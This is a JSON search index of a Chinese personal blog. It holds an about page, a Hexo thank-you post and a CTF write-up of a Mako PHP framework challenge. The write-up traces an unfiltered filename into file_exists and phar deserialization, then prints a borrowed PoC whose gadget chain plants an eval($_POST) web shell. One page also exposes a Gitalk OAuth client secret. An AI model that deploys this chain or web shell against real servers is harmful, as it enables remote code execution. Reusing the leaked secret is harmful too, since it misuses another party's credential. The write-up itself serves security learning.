{"pages":[{"title":"","text":"你似乎来到了世界的尽头","link":"/album/index.html"},{"title":"","text":"🚩 A CTFer 💖 ACGN 🖥️ Web 2.0 &amp; Web .03 🪗 Smart Contract My Skill Set Frontend Backend DevOps Connect with me About My Username这不得不得提起我的高中生活了。高一军训的时候，教官叫我小胖，于是我同学就开始叫我阿胖。我的高中英语老师普通话不标准，掺杂着一股浓烈的方言味道，甚至英文单词都有一股浓烈的“地方特色”，有一天，他读课文，兴致正浓，刚好读到了一句话，恰巧这句话里又有一个upon，而这个upon他又专门停顿一下，重(zhong)读。当时，一股雄厚无比而又夹杂着方言味道的声浪袭来，之后我同学都管我叫upon了。 至于后面的数字，俺比较懒，哪年注册的后面就写的哪年，当然也有特例，就是2016，这个代表的不是2016年，而是指比特币每2016个区块会变更一次挖矿难度，在一些与区块链有关的社区，我注册的id大多是UPON-2016","link":"/about/index.html"},{"title":"","text":"友情链接还在添加中qwq 加载中，稍等几秒...","link":"/friend/index.html"},{"title":"","text":"来而不往非礼也畅所欲言，有留必应","link":"/message/index.html"},{"title":"","text":"&nbsp;&nbsp;听听音乐 音乐播放器由mePlayer提供，布局参照网友博客所作，感谢作者的辛勤付出。更多音乐分享请查看歌单。 &nbsp;&nbsp;看看视频 ->点击以下条目开始播放视频,向下滑动查看更多","link":"/media/index.html"},{"title":"","text":"碎碎念 tips：github登录后按时间正序查看、可点赞加❤️、本插件地址..「+99次查看」 碎碎念加载中，请稍等... $.getScript(\"/js/gitalk_self.min.js\", function () { var gitalk = new Gitalk({ clientID: '46a9f3481b46ea0129d8', clientSecret: '79c7c9cb847e141757d7864453bcbf89f0655b24', id: '666666', repo: 'issue_database', owner: 'removeif', admin: \"removeif\", createIssueManually: true, distractionFreeMode: false }); gitalk.render('comment-container1'); });","link":"/self-talking/index.html"},{"title":"音乐歌单收藏","text":"温馨提示：选择喜欢的音乐双击播放，由于版权原因部分不能播放。如果喜欢歌单收藏一下，去网易云都能播放哟！","link":"/music/index.html"}],"posts":[{"title":"How sfc9982 helped me solve hexo problem","text":"How sfc9982 helped me solve hexo problem I used removeif/hexo-theme-amazing He STFW and RTFM then he solved it. I deeply apperciate his generous assistance.His blog is at googles.plus","link":"/2022/09/29/i-love-hexo/"},{"title":"美团CTF决赛复现 mako","text":"太菜了，被大佬带进决赛了,最后就签个到 环境密码:1skr 下面部分是我在比赛的时候思考过的 1.开始页面一进来，十分的清爽，毛都没有，就一个上传文件的东西 随便传点东西，发现是来者不拒，啥都能传，但啥都干不了访问1.php只会出现404not found这是最令人异或的一点 因为题目给了docker，就本地部署一个环境，先进去看看文件都存到了哪里可以看见，文件并没有被上传到/var/www/html/这个目录下面 而文件被上传到了/var/www/html/mako/uploads这个目录下 可以肯定的是，文件上传是整不了活了 2.审计通过搜索关键词，在mako/app/reources/views/home.tpl.php里找到到了首页的源码 很明显，这是用模版渲染出来的主页, 图片都是以base64的编码形式传递的，没活整了。 这就很令人苦恼，我当时尝试了一下，使用软链接 直接寄了，没权限，这时候才想起来容器一开始写了一个读取flag的程序 目标也明确了，肯定得想办法执行readFlag，于是我搜了危险函数，然后是一无所获，要么没这个函数，要么根本无法触发 做到这里，我已经没有思路了，当时想到了反序列化，但是只知道搜unseralize，结果是毛都没搜到。 我经验太少了，当时没想到用phar 3.复现在mako/app/controllers/ImagesController.php文件中 123456789public function editGet(ViewFactory $view): string { chdir('/var/www/mako/uploads'); $fileName = $this-&gt;request-&gt;getQuery()-&gt;get('filename'); $image = new Image($fileName, new ImageMagick()); $dimensions = $image-&gt;getDimensions(); $this-&gt;view-&gt;assign('fileName', $fileName); $this-&gt;view-&gt;assign('dimensions', $dimensions); return $view-&gt;render('edit');} 可以看到，文件名是不做任何过滤的 而在mako/vendo/mako/framework/src/mako/pixl/image.php中 1234567891011121314151617public function __construct($image, ProcessorInterface $processor){ $this-&gt;image = $image; $this-&gt;processor = $processor; // Make sure that the image exists if(file_exists($this-&gt;image) === false) { throw new PixlException(vsprintf('The image [ %s ] does not exist.', [$this-&gt;image])); } // Set the image $this-&gt;processor-&gt;open($image);} 使用了能触发phar反序列化的file_exists函数 关键函数找到了，现在找链子吧 搜索__destruct(),干扰项不多，可以直接开撸 好家伙，我直接好家伙，一条龙服务了属于是qwq 4.攻击这里搬一手Arr3stY0u战队的poc吧 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpnamespace mako\\file{class FileSystem{}}namespace mako\\session\\stores{ use mako\\file\\FileSystem;class File{ protected $fileSystem; protected $sessionPath; public function __construct(){ $this-&gt;fileSystem = new FileSystem(); $this-&gt;sessionPath = '/var/www/mako/public/'; }}}namespace mako\\session{use mako\\session\\stores\\File;class Session{ protected $autoCommit; protected $destroyed = false; protected $sessionId; protected $sessionData = []; protected $store; public function __construct(){ $this-&gt;autoCommit = true; $this-&gt;destroyed = false; $this-&gt;store = new File(); $this-&gt;sessionId = 'shell.php'; $this-&gt;sessionData = ['a'=&gt;'&lt;?php eval($_POST[1]);?&gt;']; }}}namespace { $exp = new mako\\session\\Session(); $phar = new Phar('test.phar',0,'test.phar'); $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;'); $phar-&gt;setMetadata($exp); $phar-&gt;addFromString('text.txt','test'); $phar-&gt;stopBuffering();}; 上传文件getshellflag is here 5.总结反思经验不足，做题不够，欠练","link":"/2022/09/30/mt-ctf/"}],"tags":[{"name":"Hexo","slug":"Hexo","link":"/tags/Hexo/"},{"name":"Troubleshooting","slug":"Troubleshooting","link":"/tags/Troubleshooting/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"WEB","slug":"WEB","link":"/tags/WEB/"},{"name":"复现","slug":"复现","link":"/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"反序列化","slug":"反序列化","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"phar","slug":"phar","link":"/tags/phar/"}],"categories":[]}